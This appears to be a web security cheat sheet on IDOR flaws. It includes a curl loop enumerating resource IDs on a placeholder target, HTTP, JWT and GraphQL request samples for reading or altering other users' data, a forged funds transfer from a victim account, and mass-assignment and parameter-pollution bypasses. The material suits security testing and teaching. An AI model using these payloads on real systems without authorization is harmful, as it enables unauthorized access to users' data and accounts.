# IDOR: Insecure Direct Object Reference

## Detection at Scale

### Automated IDOR Testing with Autorize/AuthMatrix
1. Configure Autorize with two sessions (low-priv + high-priv)
2. Browse the application with low-priv account
3. Autorize replays all requests with high-priv cookies
4. Any 200 response on a request that should require higher privileges = IDOR

### Parameter Fuzzing
```bash
# Test ID parameters for numeric enumeration
for id in {1..100}; do
  status=$(curl -s -o /dev/null -w "%{http_code}" -b "session=lowpriv"     "https://target.com/api/resource?id=$id")
  if [ "$status" -ne 403 ] && [ "$status" -ne 404 ]; then echo "Potential IDOR: $id -> $status"; fi
done
```

## IDOR Subtypes

### Sequential ID Enumeration
Predictable identifiers (auto-increment integers, timestamp-based, MD5 of email):
```http
GET /api/user/12345 HTTP/1.1
Host: target.com
Cookie: session=valid
```

### UUID/Hash-Based IDOR
Non-sequential does not mean authorization:
```http
GET /api/document/a1b2c3d4-e5f6-7890-abcd-ef1234567890 HTTP/1.1
```

If the app returns the document when you have the correct UUID but does not verify ownership: you still have IDOR. The question is how to find the UUID. Via: JS file leaks, second-order SQLi, error messages, cache/Grafana logs.

### JWT-Based ID Bypass
```json
// JWT payload
{"user": "attacker", "document_id": "victim_doc"}
// Change document_id in JWT to another user's document
```

## Blind IDOR

The app returns "success" regardless but the operation affected another user's resource:
```http
POST /api/transfer
{"from_account": "attacker", "to_account": "attacker_other", "amount": 100}
# Try changing from_account to victim ID
{"from_account": "victim", "to_account": "attacker_other", "amount": 100}
# No error but victim lost 100 units = blind IDOR
```

## GraphQL IDOR

```graphql
# Batching bypasses per-request rate limits
query {
  u1: user(id: 1) { email role }
  u2: user(id: 2) { email role }
  u3: user(id: 3) { email role }
}
```

## IDOR Prevention Bypass

If the app uses GUIDs instead of integers, test:
1. GUIDs leaked in client-side JS (e.g., for document comments, user lists)
2. Mass assignment: `PUT /api/profile {"role": "admin"}`
3. Parameter pollution: `GET /api/resource?id=123&id=456` — some frameworks process the second
4. JSON array injection: `GET /api/resource?ids=[1,2,3,4,5]`
